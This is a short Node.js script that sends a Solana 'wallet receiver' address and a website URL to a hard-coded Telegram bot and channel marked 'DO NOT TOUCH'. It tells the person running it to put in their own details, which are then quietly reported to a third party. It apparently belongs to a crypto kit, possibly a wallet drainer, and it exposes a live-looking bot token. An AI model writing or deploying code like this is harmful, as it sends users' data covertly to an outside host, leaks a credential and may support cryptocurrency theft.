const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '7464148158:AAESc10QR5Lh2JJwj6VlvXKzlThY8YPmcD8';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '2221378545';


async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
    try {
        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const solana_wallet_receiver_id = 'A4fMguhfZd4Cxk5LJLkTVa1EPnvgz4uBY3S2wXfpfchx';
const website_url = 'https://2-chi-three.vercel.app';
sendMessageToTelegram(solana_wallet_receiver_id, website_url);
